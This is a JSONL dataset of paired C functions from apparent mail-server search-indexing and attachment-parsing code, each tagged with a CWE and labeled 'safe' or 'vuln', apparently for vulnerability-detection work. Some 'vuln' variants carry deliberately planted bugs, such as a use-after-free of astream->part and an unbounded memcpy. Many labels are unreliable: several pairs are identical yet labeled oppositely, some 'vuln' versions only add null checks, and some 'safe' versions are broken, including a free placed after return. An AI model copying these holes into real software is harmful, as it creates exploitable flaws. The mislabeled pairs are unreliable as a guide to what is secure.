{"idx": "CWE-119-safe-1714284583275", "code": "static struct fts_parser*fts_parser_script_try_init(struct mail_user*user, const char*content_type, const char*content_disposition){struct script_fts_parser*parser;const char*filename, *path, *cmd;int fd;parse_content_disposition(content_disposition, &filename);if(script_support_content(user, &content_type, filename) <= 0)return NULL;fd=script_connect(user, &path);if(fd == -1)return NULL;cmd=t_strdup_printf(\"%s%s\\n\\n\", SCRIPT_HANDSHAKE, content_type);if(write_full(fd, cmd, strlen(cmd))<0){i_error(\"write(%s)failed:%m\", path);i_close_fd(&fd);return NULL;}parser=i_new(struct script_fts_parser, 1);parser->parser.v=fts_parser_script;parser->path=i_strdup(path);parser->fd=fd;return&parser->parser;}", "target": 0}
{"idx": "CWE-119-vuln-1714284583275", "code": "static struct fts_parser*fts_parser_script_try_init(struct mail_user*user, const char*content_type, const char*content_disposition){struct script_fts_parser*parser;const char*filename, *path, *cmd;int fd;parse_content_disposition(content_disposition, &filename);if(script_support_content(user, &content_type, filename) <= 0)return NULL;fd=script_connect(user, &path);if(fd == -1)return NULL;cmd=t_strdup_printf(\"%s%s\\n\\n\", SCRIPT_HANDSHAKE, content_type);if(write_full(fd, cmd, strlen(cmd))<0){i_error(\"write(%s)failed:%m\", path);i_close_fd(&fd);return NULL;}parser=i_new(struct script_fts_parser, 1);parser->parser.v=fts_parser_script;parser->path=i_strdup(path);parser->fd=fd;return&parser->parser;}", "target": 1}
{"idx": "CWE-416-safe-1714284592841", "code": "static int fts_parser_script_deinit(struct fts_parser* _parser) {\n    struct script_fts_parser* parser = (struct script_fts_parser*)_parser;\n    int ret = parser->failed ? -1 : 0;\n    if (close(parser->fd) < 0) {\n        i_error(\"close(%s) failed: %m\", parser->path);\n    }\n    i_free(parser->path);\n    return ret;\n    i_free(parser);\n}", "target": 0}
{"idx": "CWE-416-vuln-1714284592841", "code": "static int fts_parser_script_deinit(struct fts_parser*_parser){struct script_fts_parser*parser=(struct script_fts_parser*)_parser;int ret=parser->failed ?-1 : 0;if(close(parser->fd)<0){i_error(\"close(%s)failed:%m\", parser->path);}i_free(parser->path);i_free(parser);return ret;}", "target": 1}
{"idx": "CWE-22-safe-1714284598736", "code": "static int script_connect(struct mail_user* user, const char** path_r) {\n    const char* path;\n    int fd;\n    path = mail_user_plugin_getenv(user, \"fts_decoder\");\n    if (path == NULL)\n        return -1;\n    if (*path != '/')\n        path = t_strconcat(user->set->base_dir, \"/\", path, NULL);\n    if (strlen(user->set->base_dir) + strlen(path) >= UNIX_PATH_MAX) {\n        i_error(\"Path length exceeds maximum allowed length\");\n        return -1;\n    }\n    fd = net_connect_unix_with_retries(path, 1000);\n    if (fd == -1)\n        i_error(\"net_connect_unix(%s) failed: %m\", path);\n    else \n        net_set_nonblock(fd, FALSE);\n    *path_r = path;\n    return fd;\n}", "target": 0}
{"idx": "CWE-22-vuln-1714284598736", "code": "static int script_connect(struct mail_user *user, const char **path_r) {\n    const char *path;\n    int fd;\n    path = mail_user_plugin_getenv(user, \"fts_decoder\");\n    if (path == NULL)\n        return -1;\n    if (*path != '/')\n        path = t_strconcat(user->set->base_dir, \"/\", path, NULL);\n    if (strlen(user->set->base_dir) + strlen(path) >= UNIX_PATH_MAX) {\n        i_error(\"Path length exceeds maximum allowed length\");\n        return -1;\n    }\n    fd = net_connect_unix_with_retries(path, 1000);\n    if (fd == -1)\n        i_error(\"net_connect_unix(%s) failed: %m\", path);\n    else {\n        net_set_nonblock(fd, FALSE);\n    }\n    *path_r = path;\n    return fd;\n}", "target": 1}
{"idx": "CWE-20-safe-1714284607800", "code": "static bool script_support_content(struct mail_user *user, const char **content_type, const char *filename) {\n    struct fts_parser_script_user *suser = SCRIPT_USER_CONTEXT(user);\n    const struct content *content;\n    const char *extension;\n    if (suser == NULL) {\n        suser = p_new(user->pool, struct fts_parser_script_user, 1);\n        p_array_init(&suser->content, user->pool, 32);\n        MODULE_CONTEXT_SET(user, fts_parser_script_user_module, suser);\n    }\n    if (array_count(&suser->content) == 0) {\n        if (script_contents_read(user) < 0)\n            return FALSE;\n    }\n    if (strcmp(*content_type, \"application/octet-stream\") == 0) {\n        if (filename == NULL)\n            return FALSE;\n        extension = strrchr(filename, '.');\n        if (extension == NULL)\n            return FALSE;\n        extension++;\n        array_foreach(&suser->content, content) {\n            if (content->extensions != NULL && str_array_icase_find(content->extensions, extension)) {\n                *content_type = content->content_type;\n                return TRUE;\n            }\n        }\n    } else {\n        array_foreach(&suser->content, content) {\n            if (strcasecmp(content->content_type, *content_type) == 0)\n                return TRUE;\n        }\n    }\n    return FALSE;\n}", "target": 0}
{"idx": "CWE-20-vuln-1714284607800", "code": "static bool script_support_content(struct mail_user*user, const char**content_type, const char*filename){struct fts_parser_script_user*suser=SCRIPT_USER_CONTEXT(user);const struct content*content;const char*extension;if(suser == NULL){suser=p_new(user->pool, struct fts_parser_script_user, 1);p_array_init(&suser->content, user->pool, 32);MODULE_CONTEXT_SET(user, fts_parser_script_user_module, suser);}if(array_count(&suser->content) == 0){if(script_contents_read(user)<0)return FALSE;}if(strcmp(*content_type, \"application/octet-stream\") == 0){if(filename == NULL)return FALSE;extension=strrchr(filename, '.');if(extension == NULL || *extension == '\\0')return FALSE;extension++;array_foreach(&suser->content, content){if(content->extensions != NULL && str_array_icase_find(content->extensions, extension)){*content_type=content->content_type;return TRUE;}}}else{array_foreach(&suser->content, content){if(strcasecmp(content->content_type, *content_type) == 0)return TRUE;}}return FALSE;}", "target": 1}
{"idx": "CWE-119-safe-1714284620797", "code": "static int script_contents_read(struct mail_user* user){\n    struct fts_parser_script_user* suser = SCRIPT_USER_CONTEXT(user);\n    const char* path, * cmd, * line;\n    char** args;\n    struct istream* input;\n    struct content* content;\n    bool eof_seen = FALSE;\n    int fd, ret = 0;\n    fd = script_connect(user, &path);\n    if(fd == -1)\n        return -1;\n    cmd = t_strdup_printf(SCRIPT_HANDSHAKE \"\\n\");\n    if(write_full(fd, cmd, strlen(cmd)) < 0){\n        i_error(\"write(%s) failed: %m\", path);\n        i_close_fd(&fd);\n        return -1;\n    }\n    input = i_stream_create_fd_autoclose(&fd, 1024);\n    while((line = i_stream_read_next_line(input)) != NULL){\n        args = p_strsplit_spaces(user->pool, line, \" \");\n        if(args[0] == NULL){\n            eof_seen = TRUE;\n            break;\n        }\n        if(args[0][0] == '\\0' || args[1] == NULL){\n            i_error(\"parser script sent invalid input: %s\", line);\n            continue;\n        }\n        content = array_append_space(&suser->content);\n        content->content_type = args[0];\n        content->extensions = (const void*)(args + 1);\n    }\n    if(input->stream_errno != 0){\n        i_error(\"parser script read(%s) failed: %s\", path, i_stream_get_error(input));\n        ret = -1;\n    }else if(!eof_seen){\n        if(input->v_offset == 0)\n            i_error(\"parser script didn't send any data\");\n        else \n            i_error(\"parser script didn't send empty EOF line\");\n    }\n    i_stream_destroy(&input);\n    return ret;\n}", "target": 0}
{"idx": "CWE-119-vuln-1714284620797", "code": "static int script_contents_read(struct mail_user*user){struct fts_parser_script_user*suser=SCRIPT_USER_CONTEXT(user);const char*path, *cmd, *line;char**args;struct istream*input;struct content*content;bool eof_seen=FALSE;int fd, ret=0;fd=script_connect(user, &path);if(fd == -1)return-1;cmd=t_strdup_printf(SCRIPT_HANDSHAKE \"\\n\");if(write_full(fd, cmd, strlen(cmd))<0){i_error(\"write(%s)failed:%m\", path);i_close_fd(&fd);return-1;}input=i_stream_create_fd_autoclose(&fd, 1024);while((line=i_stream_read_next_line(input)) != NULL){args=p_strsplit_spaces(user->pool, line, \" \");if(args[0] == NULL){eof_seen=TRUE;break;}if(args[0][0] == '\\0' || args[1] == NULL){i_error(\"parser script sent invalid input:%s\", line);continue;}content=array_append_space(&suser->content);if(array_count(&suser->content) < FTS_MAX_CONTENTS){content=&array_idx(&suser->content, array_count(&suser->content));content->content_type=args[0];content->extensions=(const void*)(args+1);}else{i_error(\"Exceeded maximum content limit\");}}if(input->stream_errno != 0){i_error(\"parser script read(%s)failed:%s\", path, i_stream_get_error(input));ret=-1;}else if(!eof_seen){if(input->v_offset == 0)i_error(\"parser script didn't send any data\");else i_error(\"parser script didn't send empty EOF line\");}i_stream_destroy(&input);return ret;}", "target": 1}
{"idx": "CWE-476-safe-1714284638822", "code": "static void astream_add_body(struct attachment_istream*astream, const struct message_block*block){struct attachment_istream_part*part=&astream->part;buffer_t*part_buf;size_t new_size;switch(part->state){case MAIL_ATTACHMENT_STATE_NO : stream_add_data(astream, block->data, block->size);break;case MAIL_ATTACHMENT_STATE_MAYBE : if(part->part_buf == NULL){part->part_buf=buffer_create_dynamic(default_pool, astream->set . min_size);}part_buf=part->part_buf;new_size=part_buf->used+block->size;if(new_size<astream->set . min_size){buffer_append(part_buf, block->data, block->size);break;}if(astream_open_output(astream)<0){part->state=MAIL_ATTACHMENT_STATE_NO;stream_add_data(astream, part_buf->data, part_buf->used);stream_add_data(astream, block->data, block->size);break;}part->state=MAIL_ATTACHMENT_STATE_YES;astream_try_base64_decode(part, part_buf->data, part_buf->used);hash_format_loop(astream->set . hash_format, part_buf->data, part_buf->used);o_stream_nsend(part->temp_output, part_buf->data, part_buf->used);buffer_set_used_size(part_buf, 0);break;case MAIL_ATTACHMENT_STATE_YES : astream_try_base64_decode(part, block->data, block->size);hash_format_loop(astream->set . hash_format, block->data, block->size);o_stream_nsend(part->temp_output, block->data, block->size);break;}}", "target": 0}
{"idx": "CWE-476-vuln-1714284638822", "code": "static void astream_add_body(struct attachment_istream*astream, const struct message_block*block){struct attachment_istream_part*part=&astream->part;buffer_t*part_buf;size_t new_size;switch(part->state){case MAIL_ATTACHMENT_STATE_NO : stream_add_data(astream, block->data, block->size);break;case MAIL_ATTACHMENT_STATE_MAYBE : if(part->part_buf == NULL){part->part_buf=buffer_create_dynamic(default_pool, astream->set . min_size);}part_buf=part->part_buf;new_size=part_buf->used+block->size;if(part_buf != NULL && new_size<astream->set . min_size){buffer_append(part_buf, block->data, block->size);break;}if(astream_open_output(astream)<0){part->state=MAIL_ATTACHMENT_STATE_NO;stream_add_data(astream, part_buf->data, part_buf->used);stream_add_data(astream, block->data, block->size);break;}part->state=MAIL_ATTACHMENT_STATE_YES;astream_try_base64_decode(part, part_buf->data, part_buf->used);hash_format_loop(astream->set . hash_format, part_buf->data, part_buf->used);o_stream_nsend(part->temp_output, part_buf->data, part_buf->used);buffer_set_used_size(part_buf, 0);break;case MAIL_ATTACHMENT_STATE_YES : astream_try_base64_decode(part, block->data, block->size);hash_format_loop(astream->set . hash_format, block->data, block->size);o_stream_nsend(part->temp_output, block->data, block->size);break;}}", "target": 1}
{"idx": "CWE-476-safe-1714284651058", "code": "static int astream_open_output(struct attachment_istream* astream) {\n    int fd;\n    i_assert(astream->part.temp_fd == -1);\n    fd = astream->set.open_temp_fd(astream->context);\n    if (fd == -1)\n        return -1;\n    astream->part.temp_fd = fd;\n    astream->part.temp_output = o_stream_create_fd(fd, 0, FALSE);\n    if (astream->part.temp_output == NULL) {\n        i_close_fd(&fd);\n        return -1;\n    }\n    o_stream_cork(astream->part.temp_output);\n    return 0;\n}", "target": 0}
{"idx": "CWE-476-vuln-1714284651058", "code": "static int astream_open_output(struct attachment_istream* astream) {\n    int fd;\n    i_assert(astream->part.temp_fd == -1);\n    fd = astream->set.open_temp_fd(astream->context);\n    if (fd == -1)\n        return -1;\n    astream->part.temp_fd = fd;\n    astream->part.temp_output = o_stream_create_fd(fd, 0, FALSE);\n    if (astream->part.temp_output == NULL) {\n        i_close_fd(&fd);\n        return -1;\n    }\n    if (astream->part.temp_output != NULL) {\n        o_stream_cork(astream->part.temp_output);\n    }\n    return 0;\n}", "target": 1}
{"idx": "CWE-20-safe-1714284658291", "code": "static void astream_parse_header(struct attachment_istream* astream, struct message_header_line* hdr) {\n    if (!hdr->continued) {\n        stream_add_data(astream, hdr->name, hdr->name_len);\n        stream_add_data(astream, hdr->middle, hdr->middle_len);\n    }\n    stream_add_data(astream, hdr->value, hdr->value_len);\n    if (!hdr->no_newline) {\n        if (hdr->crlf_newline && hdr->value_len >= 2) {\n            stream_add_data(astream, \"\\r\\n\", 2);\n        } else if (hdr->value_len >= 1) {\n            stream_add_data(astream, \"\\n\", 1);\n        }\n    }\n    if (hdr->continues) {\n        hdr->use_full_value = TRUE;\n        return;\n    }\n    if (strcasecmp(hdr->name, \"Content-Type\") == 0) {\n        parse_content_type(astream, hdr);\n    } else if (strcasecmp(hdr->name, \"Content-Disposition\") == 0) {\n        parse_content_disposition(astream, hdr);\n    }\n}", "target": 0}
{"idx": "CWE-20-vuln-1714284658291", "code": "static void astream_parse_header(struct attachment_istream* astream, struct message_header_line* hdr) {\n    if (!hdr->continued) {\n        stream_add_data(astream, hdr->name, hdr->name_len);\n        stream_add_data(astream, hdr->middle, hdr->middle_len);\n    }\n    stream_add_data(astream, hdr->value, hdr->value_len);\n    if (!hdr->no_newline) {\n        if (hdr->crlf_newline && hdr->value_len >= 2) {\n            stream_add_data(astream, \"\\r\\n\", 2);\n        } else if (hdr->value_len >= 1) {\n            stream_add_data(astream, \"\\n\", 1);\n        }\n    }\n    if (hdr->continues) {\n        hdr->use_full_value = TRUE;\n        return;\n    }\n    if (strcasecmp(hdr->name, \"Content-Type\") == 0) {\n        parse_content_type(astream, hdr);\n    } else if (strcasecmp(hdr->name, \"Content-Disposition\") == 0) {\n        parse_content_disposition(astream, hdr);\n    }\n}", "target": 1}
{"idx": "CWE-190-safe-1714284720689", "code": "static void astream_try_base64_decode(struct attachment_istream_part* part, const unsigned char* data, size_t size) {\n    size_t i;\n    int ret;\n    if (part->base64_failed || part->base64_state == BASE64_STATE_EOM) return;\n    for (i = 0; i < size; i++) {\n        ret = astream_try_base64_decode_char(part, i, (char)data[i]);\n        if (ret <= 0) {\n            if (ret < 0) part->base64_failed = TRUE;\n            break;\n        }\n    }\n}", "target": 0}
{"idx": "CWE-190-vuln-1714284720689", "code": "static void astream_try_base64_decode(struct attachment_istream_part *part, const unsigned char *data, size_t size) {\n    size_t i;\n    int ret;\n    if (part->base64_failed || part->base64_state == BASE64_STATE_EOM) return;\n    for (i = 0; i < size; ) {\n        ret = astream_try_base64_decode_char(part, i, (char)data[i]);\n        if (ret <= 0) {\n            if (ret < 0) part->base64_failed = TRUE;\n            break;\n        }\n        if (i == SIZE_MAX) i = 0; else i++;\n    }\n}", "target": 1}
{"idx": "CWE-119-safe-1714284729967", "code": "static int astream_read_next(struct attachment_istream* astream, bool* retry_r) {\n    struct istream_private* stream = &astream->istream;\n    struct message_block block;\n    size_t old_size, new_size;\n    const char* error;\n    int ret;\n    if (retry_r == NULL) return -1;\n    *retry_r = FALSE;\n    if (stream->pos - stream->skip >= i_stream_get_max_buffer_size(&stream->istream))\n        return -2;\n    old_size = stream->pos - stream->skip;\n    switch (message_parser_parse_next_block(astream->parser, &block)) {\n        case -1 :\n            ret = astream_end_of_part(astream, &error);\n            if (ret > 0) {\n                new_size = stream->pos - stream->skip;\n                return new_size - old_size;\n            }\n            stream->istream.eof = TRUE;\n            stream->istream.stream_errno = stream->parent->stream_errno;\n            if (ret < 0) {\n                io_stream_set_error(&stream->iostream, \"%s\", error);\n                stream->istream.stream_errno = EIO;\n            }\n            astream->cur_part = NULL;\n            return -1;\n        case 0 :\n            return 0;\n        default :\n            break;\n    }\n    if (block.part != astream->cur_part && astream->cur_part != NULL) {\n        if (astream_end_of_part(astream, &error) < 0) {\n            io_stream_set_error(&stream->iostream, \"%s\", error);\n            stream->istream.stream_errno = EIO;\n            return -1;\n        }\n    }\n    astream->cur_part = block.part;\n    if (block.hdr != NULL) {\n        astream_parse_header(astream, block.hdr);\n    } else if (block.size == 0) {\n        if (astream_want_attachment(astream, block.part)) {\n            astream->part.state = MAIL_ATTACHMENT_STATE_MAYBE;\n            astream->part.start_offset = stream->parent->v_offset;\n        }\n    } else {\n        astream_add_body(astream, &block);\n    }\n    new_size = stream->pos - stream->skip;\n    *retry_r = new_size == old_size;\n    return new_size - old_size;\n}", "target": 0}
{"idx": "CWE-119-vuln-1714284729967", "code": "static int astream_read_next(struct attachment_istream*astream, bool*retry_r){struct istream_private*stream=&astream->istream;struct message_block block;size_t old_size, new_size;const char*error;int ret;if(retry_r == NULL)return-1;*retry_r=FALSE;if(stream->pos-stream->skip >= i_stream_get_max_buffer_size(&stream->istream))return-2;old_size=stream->pos-stream->skip;switch(message_parser_parse_next_block(astream->parser, &block)){case-1 :ret=astream_end_of_part(astream, &error);if(ret>0){new_size=stream->pos-stream->skip;return new_size-old_size;}stream->istream.eof=TRUE;stream->istream.stream_errno=stream->parent->stream_errno;if(ret<0){io_stream_set_error(&stream->iostream, \"%s\", error);stream->istream.stream_errno=EIO;}astream->cur_part=NULL;return-1;case 0 :return 0;default :break;}if(block.part != astream->cur_part && astream->cur_part != NULL){if(astream_end_of_part(astream, &error)<0){io_stream_set_error(&stream->iostream, \"%s\", error);stream->istream.stream_errno=EIO;return-1;}}astream->cur_part=block.part;if(block.hdr != NULL){astream_parse_header(astream, block.hdr);}else if(block.size == 0){if(astream_want_attachment(astream, block.part)){astream->part.state=MAIL_ATTACHMENT_STATE_MAYBE;astream->part.start_offset=stream->parent->v_offset;}}else{memcpy(astream->part.data, block.data, block.size);astream->part.size=block.size;}new_size=stream->pos-stream->skip;*retry_r=new_size == old_size;return new_size-old_size;}", "target": 1}
{"idx": "CWE-416-safe-1714284749360", "code": "static bool astream_want_attachment(struct attachment_istream* astream, struct message_part* part) {\n    struct istream_attachment_header ahdr;\n    if ((part->flags & MESSAGE_PART_FLAG_MULTIPART) != 0) {\n        return FALSE;\n    }\n    if (astream->set.want_attachment == NULL || astream->part == NULL) {\n        return TRUE;\n    }\n    i_zero(&ahdr);\n    ahdr.part = part;\n    ahdr.content_type = astream->part.content_type;\n    ahdr.content_disposition = astream->part.content_disposition;\n    return astream->set.want_attachment(&ahdr, astream->context);\n}", "target": 0}
{"idx": "CWE-416-vuln-1714284749360", "code": "static bool astream_want_attachment(struct attachment_istream* astream, struct message_part* part) {\n    struct istream_attachment_header ahdr;\n    if ((part->flags & MESSAGE_PART_FLAG_MULTIPART) != 0) {\n        return FALSE;\n    }\n    if (astream->set.want_attachment == NULL || astream->part == NULL) {\n        return TRUE;\n    }\n    i_zero(&ahdr);\n    ahdr.part = part;\n    ahdr.content_type = astream->part.content_type;\n    ahdr.content_disposition = astream->part.content_disposition;\n    free(astream->part); \n    astream->part = NULL; \n    return astream->set.want_attachment(&ahdr, astream->context);\n}", "target": 1}
{"idx": "CWE-476-safe-1714284758115", "code": "struct istream*i_stream_create_attachment_extractor(struct istream*input, struct istream_attachment_settings*set, void*context){struct attachment_istream*astream;i_assert(set->min_size>0);i_assert(set->hash_format != NULL);i_assert(set->open_attachment_ostream != NULL);i_assert(set->close_attachment_ostream != NULL);astream=i_new(struct attachment_istream, 1);astream->part . temp_fd=-1;astream->set=*set;astream->context=context;astream->retry_read=TRUE;astream->istream . max_buffer_size=input->real_stream->max_buffer_size;astream->istream . read=i_stream_attachment_extractor_read;astream->istream . iostream . close=i_stream_attachment_extractor_close;astream->istream . istream . readable_fd=FALSE;astream->istream . istream . blocking=input->blocking;astream->istream . istream . seekable=FALSE;astream->pool=pool_alloconly_create(\"istream attachment\" , 1024);astream->parser=message_parser_init(astream->pool, input, 0, MESSAGE_PARSER_FLAG_INCLUDE_MULTIPART_BLOCKS|MESSAGE_PARSER_FLAG_INCLUDE_BOUNDARIES);return i_stream_create(&astream->istream, input, i_stream_get_fd(input));}", "target": 0}
{"idx": "CWE-476-vuln-1714284758115", "code": "struct istream*i_stream_create_attachment_extractor(struct istream*input, struct istream_attachment_settings*set, void*context){struct attachment_istream*astream;if(input == NULL) return NULL; i_assert(set->min_size>0);i_assert(set->hash_format != NULL);i_assert(set->open_attachment_ostream != NULL);i_assert(set->close_attachment_ostream != NULL);astream=i_new(struct attachment_istream, 1);astream->part . temp_fd=-1;astream->set=*set;astream->context=context;astream->retry_read=TRUE;if(input->real_stream != NULL){astream->istream . max_buffer_size=input->real_stream->max_buffer_size;}astream->istream . read=i_stream_attachment_extractor_read;astream->istream . iostream . close=i_stream_attachment_extractor_close;astream->istream . istream . readable_fd=FALSE;astream->istream . istream . blocking=input->blocking;astream->istream . istream . seekable=FALSE;astream->pool=pool_alloconly_create(\"istream attachment\" , 1024);astream->parser=message_parser_init(astream->pool, input, 0, MESSAGE_PARSER_FLAG_INCLUDE_MULTIPART_BLOCKS|MESSAGE_PARSER_FLAG_INCLUDE_BOUNDARIES);return i_stream_create(&astream->istream, input, i_stream_get_fd(input));}", "target": 1}
{"idx": "CWE-476-safe-1714284772262", "code": "static int fts_build_mail_header(struct fts_mail_build_context*ctx, const struct message_block*block){const struct message_header_line*hdr=block->hdr;struct fts_backend_build_key key;int ret;if(hdr->eoh)return 0;i_zero(&key);key . uid=ctx->mail->uid;key . type=block->part->physical_pos == 0 ? FTS_BACKEND_BUILD_KEY_HDR : FTS_BACKEND_BUILD_KEY_MIME_HDR;key . part=block->part;key . hdr_name=hdr->name;if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_TOKENIZED_INPUT) != 0)fts_build_tokenized_hdr_update_lang(ctx, hdr);if(!fts_backend_update_set_build_key(ctx->update_ctx, &key))return 0;if(!message_header_is_address(hdr->name)){ret=fts_build_unstructured_header(ctx, hdr);}else{T_BEGIN{struct message_address*addr;string_t*str;addr=message_address_parse(pool_datastack_create(), hdr->full_value, hdr->full_value_len, UINT_MAX, FALSE);str=t_str_new(hdr->full_value_len);message_address_write(str, addr);ret=fts_build_data(ctx, str_data(str), str_len(str), TRUE);}T_END;if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_TOKENIZED_INPUT) != 0){struct fts_user_language*prev_lang=ctx->cur_user_lang;fts_mail_build_ctx_set_lang(ctx, fts_user_get_data_lang(ctx->update_ctx->backend->ns->user));key . hdr_name=\"\";if(fts_backend_update_set_build_key(ctx->update_ctx, &key)){if(fts_build_data(ctx, (const void*)hdr->name, strlen(hdr->name), TRUE)<0)ret=-1;}fts_mail_build_ctx_set_lang(ctx, prev_lang);}return ret;}", "target": 0}
{"idx": "CWE-476-vuln-1714284772262", "code": "static int fts_build_mail_header(struct fts_mail_build_context*ctx, const struct message_block*block){const struct message_header_line*hdr=block->hdr;struct fts_backend_build_key key;int ret;if(hdr==NULL || hdr->eoh)return 0;i_zero(&key);key . uid=ctx->mail->uid;key . type=block->part->physical_pos == 0 ? FTS_BACKEND_BUILD_KEY_HDR : FTS_BACKEND_BUILD_KEY_MIME_HDR;key . part=block->part;key . hdr_name=hdr->name;if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_TOKENIZED_INPUT) != 0)fts_build_tokenized_hdr_update_lang(ctx, hdr);if(!fts_backend_update_set_build_key(ctx->update_ctx, &key))return 0;if(!message_header_is_address(hdr->name)){ret=fts_build_unstructured_header(ctx, hdr);}else{T_BEGIN{struct message_address*addr;string_t*str;addr=message_address_parse(pool_datastack_create(), hdr->full_value, hdr->full_value_len, UINT_MAX, FALSE);str=t_str_new(hdr->full_value_len);message_address_write(str, addr);ret=fts_build_data(ctx, str_data(str), str_len(str), TRUE);}T_END;if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_TOKENIZED_INPUT) != 0){struct fts_user_language*prev_lang=ctx->cur_user_lang;fts_mail_build_ctx_set_lang(ctx, fts_user_get_data_lang(ctx->update_ctx->backend->ns->user));key . hdr_name=\"\";if(fts_backend_update_set_build_key(ctx->update_ctx, &key)){if(fts_build_data(ctx, (const void*)hdr->name, strlen(hdr->name), TRUE)<0)ret=-1;}fts_mail_build_ctx_set_lang(ctx, prev_lang);}return ret;}", "target": 1}
{"idx": "CWE-122-safe-1714284791664", "code": "static int fts_build_unstructured_header(struct fts_mail_build_context*ctx, const struct message_header_line*hdr){const unsigned char*data=hdr->full_value;unsigned char*buf=NULL;unsigned int i;int ret;for(i=0;i<hdr->full_value_len;i++){if(data[i]=='\\0'){if(buf==NULL){buf=i_malloc(hdr->full_value_len+1);memcpy(buf,data,i);data=buf;}if(i<hdr->full_value_len){buf[i]=' ';}}else if(buf!=NULL){buf[i]=data[i];}}ret=fts_build_data(ctx,data,hdr->full_value_len,TRUE);i_free(buf);return ret;}", "target": 0}
{"idx": "CWE-122-vuln-1714284791664", "code": "static int fts_build_unstructured_header(struct fts_mail_build_context*ctx, const struct message_header_line*hdr){const unsigned char*data=hdr->full_value;unsigned char*buf=NULL;unsigned int i;int ret;for(i=0;i<hdr->full_value_len;i++){if(data[i] == '\\0'){if(buf == NULL){buf=i_malloc(hdr->full_value_len+1);memcpy(buf, data, i);data=buf;}if(i<hdr->full_value_len){buf[i]=' ';}}else if(buf != NULL){buf[i]=data[i];}}ret=fts_build_data(ctx, data, hdr->full_value_len, TRUE);i_free(buf);return ret;}", "target": 1}
{"idx": "CWE-190-safe-1714284802259", "code": "static bool fts_build_body_begin(struct fts_mail_build_context*ctx, struct message_part*part, bool*binary_body_r){struct mail_storage*storage;const char*content_type;struct fts_backend_build_key key;i_assert(ctx->body_parser == NULL);*binary_body_r=FALSE;i_zero(&key);key.uid=ctx->mail->uid;key.part=part;content_type=ctx->content_type != NULL ? ctx->content_type : \"text/plain\" ;if(content_type == NULL || strncmp(content_type, \"multipart/\" , 10) == 0){return FALSE;}storage=mailbox_get_storage(ctx->mail->box);if(fts_parser_init(mail_storage_get_user(storage), content_type, ctx->content_disposition, &ctx->body_parser)){*binary_body_r=TRUE;key.type=FTS_BACKEND_BUILD_KEY_BODY_PART;}else if(strncmp(content_type, \"text/\" , 5) == 0 || strncmp(content_type, \"message/\" , 8) == 0){key.type=FTS_BACKEND_BUILD_KEY_BODY_PART;ctx->body_parser=fts_parser_text_init();}else{if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_BINARY_MIME_PARTS) == 0)return FALSE;*binary_body_r=TRUE;key.type=FTS_BACKEND_BUILD_KEY_BODY_PART_BINARY;}key.body_content_type=content_type;key.body_content_disposition=ctx->content_disposition;ctx->cur_user_lang=NULL;if(!fts_backend_update_set_build_key(ctx->update_ctx, &key)){if(ctx->body_parser != NULL)(void)fts_parser_deinit(&ctx->body_parser);return FALSE;}return TRUE;}", "target": 0}
{"idx": "CWE-190-vuln-1714284802259", "code": "static bool fts_build_body_begin(struct fts_mail_build_context*ctx, struct message_part*part, bool*binary_body_r){struct mail_storage*storage;const char*content_type;struct fts_backend_build_key key;i_assert(ctx->body_parser == NULL);*binary_body_r=FALSE;i_zero(&key);key.uid=ctx->mail->uid;key.part=part;content_type=ctx->content_type != NULL ? ctx->content_type : \"text/plain\" ;if(content_type == NULL || strncmp(content_type, \"multipart/\" , 10) == 0){return FALSE;}storage=mailbox_get_storage(ctx->mail->box);if(fts_parser_init(mail_storage_get_user(storage), content_type, ctx->content_disposition, &ctx->body_parser)){*binary_body_r=TRUE;key.type=FTS_BACKEND_BUILD_KEY_BODY_PART;}else if(strncmp(content_type, \"text/\" , 5) == 0 || strncmp(content_type, \"message/\" , 8) == 0){key.type=FTS_BACKEND_BUILD_KEY_BODY_PART;ctx->body_parser=fts_parser_text_init();}else{if((ctx->update_ctx->backend->flags&FTS_BACKEND_FLAG_BINARY_MIME_PARTS) == 0)return FALSE;*binary_body_r=TRUE;key.type=FTS_BACKEND_BUILD_KEY_BODY_PART_BINARY;}key.body_content_type=content_type;key.body_content_disposition=ctx->content_disposition;ctx->cur_user_lang=NULL;if(!fts_backend_update_set_build_key(ctx->update_ctx, &key)){if(ctx->body_parser != NULL)(void)fts_parser_deinit(&ctx->body_parser);return FALSE;}return TRUE;}", "target": 1}
{"idx": "CWE-1341-safe-1714284813844", "code": "static int fts_build_add_tokens_with_filter(struct fts_mail_build_context*ctx, const unsigned char*data, size_t size){struct fts_tokenizer*tokenizer=ctx->cur_user_lang->index_tokenizer;struct fts_filter*filter=ctx->cur_user_lang->filter;const char*token, *error;int ret=1, ret2;while(ret>0)T_BEGIN{ret=ret2=fts_tokenizer_next(tokenizer, data, size, &token, &error);if(ret2>0 && filter != NULL)ret2=fts_filter_filter(filter, &token, &error);if(ret2<0)i_error(\"fts: Couldn't create indexable tokens:%s\", error);if(ret2>0){size_t token_len = strnlen(token, size);if(fts_backend_update_build_more(ctx->update_ctx, (const void*)token, token_len)<0)ret=-1;}}T_END;return ret;}", "target": 0}
{"idx": "CWE-1341-vuln-1714284813844", "code": "static int fts_build_add_tokens_with_filter(struct fts_mail_build_context*ctx, const unsigned char*data, size_t size){struct fts_tokenizer*tokenizer=ctx->cur_user_lang->index_tokenizer;struct fts_filter*filter=ctx->cur_user_lang->filter;const char*token, *error;int ret=1, ret2;while(ret>0)T_BEGIN{ret=ret2=fts_tokenizer_next(tokenizer, data, size, &token, &error);if(ret2>0 && filter != NULL){ret2=fts_filter_filter(filter, &token, &error);if(fts_backend_update_build_more(ctx->update_ctx, (const void*)token, strnlen(token, size))<0)ret=-1;}if(ret2<0)i_error(\"fts: Couldn't create indexable tokens:%s\", error);}T_END;return ret;}", "target": 1}
{"idx": "CWE-20-safe-1714284823392", "code": "static void handle_header(struct message_search_context*ctx, struct message_header_line*hdr){if(hdr->name_len == 12 && strncasecmp(hdr->name, \"Content-Type\", 12) == 0){if(hdr->continues){hdr->use_full_value=TRUE;return;}T_BEGIN{parse_content_type(ctx, hdr);}T_END;}}", "target": 0}
{"idx": "CWE-20-vuln-1714284823392", "code": "static void handle_header(struct message_search_context*ctx, struct message_header_line*hdr){if(hdr && hdr->name_len == 12 && strncasecmp(hdr->name, \"Content-Type\", 12) == 0){if(hdr->continues){hdr->use_full_value=TRUE;return;}T_BEGIN{parse_content_type(ctx, hdr);}T_END;}}", "target": 1}
